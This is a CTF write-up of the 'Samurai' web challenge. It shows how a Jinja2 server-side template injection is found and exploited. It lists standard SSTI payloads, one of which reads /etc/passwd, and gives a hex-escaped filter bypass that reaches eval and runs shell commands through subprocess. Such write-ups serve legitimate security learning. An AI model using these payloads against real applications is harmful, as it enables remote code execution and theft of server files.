---
title: "Samurai"
ctf: "2025_SADC-NextGenCyber-CTF"
category: "Web"
difficulty: "Not specified"
points: 0
techniques: ["web", "xss"]
tools: ["burp", "python"]
keywords: ["samurai", "web"]
status: "solved"
has_script: false
source: "2025_SADC-NextGenCyber-CTF/Web/Samurai.md"
---

## Summary

Challenge **Samurai** from the 2025_SADC-NextGenCyber-CTF CTF, web category.

## Statement and artefacts

See the original challenge files; provided artefacts are not copied.

## Recognition signals

- (see resolution method below)

## Resolution method

## Samurai [150pts]

`I guess i'm awesome i developed this using my Samurai-coding skills...`

this is the website

![The page](img/sam1.png)

I directly think to XSS(Cross-Site Scripting) and  SSTI(Server Side Template Injection); but just SSTI can give us code execution so i focus on it directly
In our burp we notice that the app is build with python: `Server: Werkzeug/1.0.1 Python/2.7.18` so
First test : `{{ 7*7 }}`

![Fact](img/sam2.png)

He he he

![he he](img/pisica-cat.gif)

Alright let exploit this vuln to get our flag

Generally the purpose is to open a file named `flag.txt` on the system i think,  so in python when we talk about reading file we can call `os.open` there let try to import the os and read the flag

![alert](img/red-alert.gif)

![Oups](img/sam3.png)

It was obvious. There are some filter there so the text to enter can't contains these keywords/characters:
`'config', '_' , 'RUNCMD', 'os' or 'base'`

What that mean any payload like :

```python
{{ ''.__class__.__mro__[2].__subclasses__() }}

{{ self.__init__.__globals__.__builtins__ }}

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

may not work! So what solution can we have there
maybe encoding any characters, or use modules that do the same thing

first let do an recon
![begin](img/sam4.png)

![and](img/sam5.png)

A few moment later I got this who can help me to get my flag

```python
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['eval']("\x5f\x5fim" "port\x5f\x5f('subprocess').check\x5foutput('cat flag.txt', shell=True)") }}
```

I use `request['application']['__globals__']` to get the top of the code where i can find  `__builtins__` and use it to get `eval` and execute shell code with `subprocess` and the result we get our flag
![flag](img/sam6.png)


## Flag

Not specified

## Lessons and reusable patterns

- (see resolution method above)
